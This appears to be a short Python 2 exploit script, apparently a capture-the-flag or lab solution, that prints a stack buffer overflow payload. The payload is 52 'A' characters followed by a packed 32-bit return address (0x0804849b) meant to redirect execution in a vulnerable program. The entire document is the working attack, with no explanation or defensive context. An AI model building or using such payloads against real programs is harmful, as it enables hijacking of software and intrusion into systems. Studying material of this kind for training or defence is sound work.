import struct
padding = "A" * 52
printAddress = struct.pack("I", 0x0804849b)
print padding+printAddress
